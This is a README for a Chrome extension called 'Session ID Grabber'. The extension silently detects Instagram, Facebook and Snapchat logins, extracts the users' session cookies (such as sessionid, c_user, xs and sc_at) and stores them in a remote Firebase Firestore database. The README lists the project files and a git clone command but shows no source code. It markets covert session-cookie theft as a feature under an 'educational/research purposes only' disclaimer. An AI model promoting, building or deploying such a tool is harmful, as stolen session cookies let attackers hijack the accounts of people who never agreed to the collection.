# Session ID Grabber (Chrome Extension)

A powerful Chrome Extension that automatically detects when a user logs in, extracts their **Session ID**, and securely stores everything in **Firebase Firestore**. Ideal for developers working on automation, analytics, or user session management (educational/research purposes only).

---

## 🚀 Features

- ✅ Auto-detects Instagram, Facebook, and Snapchat logins
- 🔍 Extracts session cookies (like `sessionid`, `c_user`, `xs`, `sc_at`, etc.)
- ☁️ Stores all data securely in Firebase Firestore
- ⚡ Built with Manifest V3 + modern ES Modules
- 🧠 Clean, modular code using background + content scripts
- 🔐 Runs silently in background without user interaction

---

## 📂 Project Structure
```
SessionID-Public/
├── icons/
│   ├── 48.png                  # Toolbar icon (48x48)
│   └── 128.png                 # Chrome Web Store icon (128x128)
│
├── background.js              # Core logic to extract and save session cookies
├── wake.js                    # Keeps the service worker alive (optional)
├── firebase-init.js           # Firebase config + initialization
├── firebase-firestore.js      # Modular Firestore SDK import
├── manifest.json              # Chrome extension config (Manifest V3)
├── utils.js                   # Utility functions (if any)
└── readme.md                  # You're reading this!

```

---



## 🔧 Setup Instructions

### 1. Clone the Repo

```bash
git clone https://github.com/avdeshjadon/SessionID-Public.git
cd sessionId-Public
```
